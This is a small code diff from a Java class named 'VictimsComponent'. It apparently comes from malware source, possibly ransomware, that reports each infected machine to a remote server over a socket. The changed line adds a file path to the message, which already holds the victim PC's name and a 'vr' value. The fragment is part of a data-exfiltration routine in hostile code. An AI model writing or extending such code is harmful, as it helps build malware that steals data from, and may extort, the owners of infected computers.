@@ -108,7 +108,7 @@ public class VictimsComponent implements
 								PrintWriter out = new PrintWriter(echoSocket.getOutputStream(), true);
 								BufferedReader in = new BufferedReader(new InputStreamReader(echoSocket.getInputStream()));
 								BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {
-							String toSend = pcName + SALT + vr.toString();
+							String toSend = pcName + SALT + vr.toString() + SALT + path;
 							out.println(toSend);
 							out.println();
 							echoSocket.close();
